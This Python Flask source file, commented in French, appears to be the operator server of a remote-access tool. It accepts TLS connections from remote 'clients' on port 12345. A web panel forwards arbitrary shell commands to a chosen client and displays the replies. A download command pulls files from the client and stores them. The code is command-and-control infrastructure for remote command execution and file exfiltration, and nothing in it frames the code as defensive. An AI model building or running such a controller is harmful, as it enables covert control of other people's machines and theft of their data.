from flask import Flask, render_template, request, redirect, url_for
import socket
import threading
import time  
import ssl
import struct
import os

# création de l'appli 
app = Flask(__name__)

# initialisation client
clients = []
client_lock = threading.Lock()
selected_client = {}

# config socket
HOST = '0.0.0.0'
PORT = 12345

def create_socket():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    time.sleep(1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[+] Serveur Flask en attente de connexions sur {HOST}:{PORT}")

    return context.wrap_socket(s, server_side=True)

def accept_clients(server_socket):
    client_id = 1
    while True:
        sock, addr = server_socket.accept()
        with client_lock:
            clients.append({"id": client_id, "sock": sock, "addr": addr, "history": []})
        print(f"[+] Client {client_id} connecté depuis {addr}")
        client_id += 1

def receive_files(sock, client_id, base_dir="downloads"):
    client_dir = os.path.join(base_dir, f"client_{client_id}")
    os.makedirs(client_dir, exist_ok=True)

    while True:
        try: 
            # lis la taille du nom de fichier
            raw_len = sock.recv(4)
            if not raw_len:
                break
            name_len = struct.unpack("!I", raw_len)[0]

            # lis le nom du fichier
            filename = sock.recv(name_len).decode()
            prefixed_name = f"client_{client_id}_{filename}"

            # lis la taillle du fichier
            raw_size = sock.recv(8)
            filesize = struct.unpack("!Q", raw_size)[0]

            # sauvegarde du fichier
            filepath = os.path.join(client_dir, prefixed_name)
            with open(filepath, "wb") as f:
                remaining = filesize
                while remaining > 0:
                    chunk = sock.recv(min(4096, remaining))
                    if not chunk:
                        break
                    f.write(chunk)
                    remaining -= len(chunk)

                print(f"[✓] Fichier reçu : {filepath} ({filesize} octets)")
        except Exception as e:
            print(f"[!] Erreur de réception : {e}")
            break

# page d'accueil 
@app.route('/')
def index():
    with client_lock:
        connected_clients = [
            {"id": c["id"], "addr": f"{c['addr'][0]}:{c['addr'][1]}"} for c in clients
        ]
    return render_template('index.html', clients=connected_clients)

# controle d'un client
@app.route('/client/<int:client_id>', methods=['GET', 'POST'])
def control_client(client_id):
    with client_lock:
        client = next((c for c in clients if c['id'] == client_id), None)

    if not client:
        return f"Client {client_id} non trouvé", 404

    response = ""
    if request.method == 'POST':
        command = request.form['command']
        try:
            client['sock'].send(command.encode())
            if command.startswith("download"):
                receive_files(client['sock'], client['id'])
                final_msg = client['sock'].recv(4096).decode().strip()
                response = final_msg or "[✓ Fichiers reçus]"
            else:
                data = client['sock'].recv(4096).decode()
                response = data.strip()
            client['history'].append((command, response))
        except Exception as e:
            response = f"Erreur: {e}"
            client['history'].append((command, response))

    return render_template('control.html', client=client)

# déconnexion d'un client
@app.route('/client/<int:client_id>/disconnect')
def disconnect_client(client_id):
    with client_lock:
        client = next((c for c in clients if c['id'] == client_id), None)
        if client:
            try:
                client['sock'].send(b"disconnect")
                client['sock'].close()
            except:
                pass
            clients.remove(client)
    return redirect(url_for('index'))

# clear d'un client
@app.route('/client/<int:client_id>/clear', methods=['POST'])
def clear_history(client_id):
    with client_lock:
        client = next((c for c in clients if c['id'] == client_id), None)
        if client:
            client['history'] = []
    return redirect(url_for('control_client', client_id=client_id))

# lancement de l'appli
if __name__ == '__main__':
    server_socket = create_socket()
    threading.Thread(target=accept_clients, args=(server_socket,), daemon=True).start()
    app.run(debug=False, host='127.0.0.1', port=5000)
